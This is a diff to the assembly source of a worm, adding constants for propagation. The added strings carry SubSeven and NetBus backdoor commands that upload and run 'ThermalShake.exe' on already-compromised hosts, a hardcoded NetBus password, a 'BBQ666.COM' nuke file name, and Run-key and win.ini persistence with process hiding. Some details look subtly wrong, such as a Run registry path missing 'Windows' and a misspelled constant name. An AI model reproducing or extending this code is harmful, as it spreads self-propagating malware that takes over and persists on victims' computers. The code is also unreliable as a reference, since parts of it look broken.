@@ -90,7 +90,7 @@ EXTRN       gethostbyname:PROC
 EXTRN       inet_ntoa:PROC
 
 ;; Some constant definitions, that get important later
-WORM_SIZE                   EQU     6144
+WORM_SIZE                   EQU     60
 SEM_NOGPFAUL_TERRORBOX      EQU     00000002h
 OPEN_EXISTING               EQU     00000003h
 CREATE_ALWAYS               EQU     00000002h
@@ -116,3 +116,30 @@ SOCK_STREAM                 EQU     1
 SOCK_RAW                    EQU     3
 FIONBIO                     EQU     8004667Eh
 WM_QUIT                     EQU     0012h
+
+;; Define the binary name for uploading to SubSeven
+UPLOAD_REQUEST              DB      "RTFThermalShake.exe"
+END_UPLOAD_REQUEST
+;; Define the primary worm-body size for the upload
+UPLOAD_SIZE                 DB      "SFT0460"
+END_UPLOAD_SIZE
+;; Define the SubSEven execution request binary-name
+EXEC_REQUEST                DB      "FMXThermalShake.exe"
+END_EXEC_REQUEST
+;; Define the Password for interfacing with the NetBUS service
+NETBUS_PASSWORD             DB      "Password;1;netbus", 0Dh
+END_NETBUS_PASSWORD
+;; Define function for dealing with the NetBUS upload request
+NETBUS_UPLOAD_REQUEST       DB      "UploadFile;ThermalShake.exe;60;\", 0Dh
+END_NETBUS_UPLOAD_REQUEST
+;; Define function for executing the received binary-file
+NETBUS_EXEC_FILE            DB      "StartApp;\ThermalShake.exe", 0Dh
+END_NETBUS_EXEC_FILE
+;; Definitions of other miscellaneous functions and variables
+DEFINITIVE_NUKE_FILE        DB      "BBQ666.COM", 0
+SZ_KERNEL32                 DB      "KERNEL32", 0
+SZ_REGSERVPROC              DB      "RegisterServiceProcess", 0
+WIN_INI_RUN_KEY             DB      "run", 0
+WIN_SECTION                 DB      "windows", 0
+RUN_KEY                     DB      "Software\Microsoft\CurrentVersion\Run", 0
+
